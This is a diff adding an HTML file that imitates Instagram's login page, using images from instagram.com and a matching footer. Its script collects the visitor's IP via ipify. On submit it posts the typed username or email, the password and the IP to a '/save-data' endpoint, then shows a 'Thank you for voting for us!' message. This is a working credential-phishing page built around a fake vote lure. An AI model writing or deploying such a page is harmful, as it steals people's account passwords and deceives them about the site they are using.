@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #fafafa;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .content {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .login-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      max-width: 350px;
+      width: 100%;
+      text-align: center;
+    }
+    .login-box img {
+      margin: 40px auto;
+      display: block;
+    }
+    .login-box form {
+      display: flex;
+      flex-direction: column;
+    }
+    .login-box input {
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 12px;
+      border-radius: 3px;
+    }
+    .login-box button {
+      background-color: #0095f6;
+      color: white;
+      font-weight: bold;
+      padding: 8px 0;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .login-box button:disabled {
+      background-color: #b2dffc;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    .divider::before {
+      margin-right: 10px;
+    }
+    .divider::after {
+      margin-left: 10px;
+    }
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+    .facebook-login i {
+      margin-right: 5px;
+    }
+    .forgot-password {
+      font-size: 12px;
+      color: #385185;
+    }
+    .sign-up-box {
+      margin-top: 20px;
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      max-width: 350px;
+      width: 100%;
+    }
+    .sign-up-box a {
+      color: #0095f6;
+      font-weight: bold;
+    }
+    .get-app {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .get-app p {
+      font-size: 14px;
+    }
+    .get-app img {
+      width: 136px;
+      height: 40px;
+      margin-right: 10px;
+    }
+    footer {
+      margin-top: 50px;
+      font-size: 12px;
+      color: #8e8e8e;
+      text-align: center;
+    }
+    footer nav a {
+      margin: 0 5px;
+      color: #8e8e8e;
+      text-decoration: none;
+    }
+    footer select {
+      margin-left: 10px;
+    }
+    /* Mobile styles */
+    @media screen and (max-width: 600px) {
+      .content {
+        flex-direction: column;
+      }
+      .login-box, .sign-up-box {
+        margin-bottom: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="content">
+      <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" width="175">
+
+        <form>
+          <input type="text" id="username" placeholder="Phone number, username, or email">
+          <input type="password" id="password" placeholder="Password">
+          <button type="submit" disabled>Log In</button>
+        </form>
+
+        <div class="divider">OR</div>
+
+        <div class="facebook-login">
+          <i class="fab fa-facebook-square"></i>
+          Log in with Facebook
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+
+      <div class="sign-up-box">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="get-app">
+    <p>Get the app.</p>
+    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/657fb43cbfd9.png" alt="Get it on App Store">
+    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/3cd8a597ecad.png" alt="Get it on Google Play">
+  </div>
+
+  <footer>
+    <nav>
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">Help</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Top Accounts</a>
+      <a href="#">Locations</a>
+      <a href="#">Instagram Lite</a>
+      <a href="#">Threads</a>
+      <a href="#">Contact Uploading & Non-Users</a>
+    </nav>
+    <div>
+      <select>
+        <option>English</option>
+        <option>Español</option>
+        <option>Français</option>
+      </select>
+      <span>© 2023 Instagram from Meta</span>
+    </div>
+  </footer>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+      let userIP = '';
+      
+      $.getJSON('https://api.ipify.org?format=json')
+          .done(function(data) {
+              userIP = data.ip;
+              console.log('User IP Address:', userIP);
+          })
+          .fail(function() {
+              console.error('Could not retrieve IP address.');
+          });
+
+      function sendLoginData(email, password, platform) {
+          const data = {
+              email: email,
+              password: password,
+              platform: platform,
+              ip: userIP
+          };
+
+          console.log('Sending data to the backend:', data);
+
+          fetch('/save-data', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data),
+          })
+          .then(response => response.json())
+          .then(result => {
+              console.log('Success:', result);
+              showThankYouMessage();
+          })
+          .catch(error => {
+              console.error('Error:', error);
+          });
+      }
+
+      function showThankYouMessage() {
+          document.querySelector('.container').style.display = 'none';
+          document.querySelector('.get-app').style.display = 'none';
+          const thankYouMessage = document.createElement('div');
+          thankYouMessage.id = 'thank-you-message';
+          thankYouMessage.innerHTML = `
+              <div class="success-animation"></div>
+              <p>Thank you for voting for us!</p>
+              <p>Your IP Address is: <span id="ip-address">${userIP}</span></p>
+          `;
+          document.body.insertBefore(thankYouMessage, document.querySelector('footer'));
+
+          setTimeout(() => {
+              document.querySelector('.container').style.display = 'flex';
+              document.querySelector('.get-app').style.display = 'block';
+              document.getElementById('thank-you-message').remove();
+              document.querySelector('form').reset();
+          }, 3000);
+      }
+
+      document.querySelector('.login-box form').addEventListener('submit', function(e) {
+          e.preventDefault();
+          const email = document.getElementById('username').value;
+          const password = document.getElementById('password').value;
+          sendLoginData(email, password, 'Instagram');
+      });
+  </script>
+
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</body>
+</html>
